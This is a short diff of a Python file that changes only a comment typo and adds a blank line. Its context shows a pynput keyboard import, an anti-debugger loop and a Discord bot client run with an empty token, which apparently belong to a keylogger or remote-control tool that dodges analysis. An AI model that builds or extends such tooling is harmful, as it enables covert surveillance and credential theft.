@@ -3,7 +3,7 @@ from pynput import keyboard
 import threading
 import ctypes
 
-#wont work on stealth debbuger
+#wont work on stealth debugger
 def debugger():
     isTrue = True
     while isTrue:
@@ -50,4 +50,5 @@ intents = discord.Intents.default()
 intents.message_content = True
 
 client = BotClient(intents=intents)
+
 client.run('')
